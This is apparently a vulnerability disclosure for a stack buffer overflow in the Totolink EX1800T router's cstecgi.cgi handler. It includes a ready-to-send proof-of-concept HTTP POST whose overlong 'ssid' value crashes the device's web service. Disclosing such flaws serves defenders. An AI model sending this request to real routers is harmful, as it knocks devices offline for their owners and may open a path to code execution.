# Totolink EX1800T  has stack overflow vulnerability.

## supplier 
https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/223/ids/36.html
## Vulnerability fille/function

cstecgi.cgi And sub_40662C() function

## describe

EX1800T V9.1.0cu.2112_B20220316 Router sub_40662C function has a buffer overflow vulnerability, which can cause a denial-of-service exploit, cause server downtime, and even execute commands. DDOS

**Code analysis**    

The analysis is as follows in IDA. /cgi-bin/cstecgi.cgi sub_40662C.
Obtain a field, and then copy the value to other variables without restrictions, causing a denial-of-service attack.

![image-20241205230643104](https://github.com/user-attachments/assets/367d3843-4b42-436d-a782-56c856c896c4)

## POC

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 127.0.0.1
Content-Length: 143
sec-ch-ua: "Chromium";v="117", "Not;A=Brand";v="8"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset:utf-8
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/page/index.html?timestamp=1719986305735
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"token":"1",
"ssid":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
"topicurl":"setRptWiFiBasicCfg"}
```

![image-20241205230804752](https://github.com/user-attachments/assets/ad141caa-a568-45e9-96d8-b8a3154c42f6)

**Result**

We were able to see that the router had a 500 down error. This led to a denial-of-service attack.

![image-20241205230813767](https://github.com/user-attachments/assets/24ff1f53-8467-47ec-8fd4-12c4e2e64ec3)


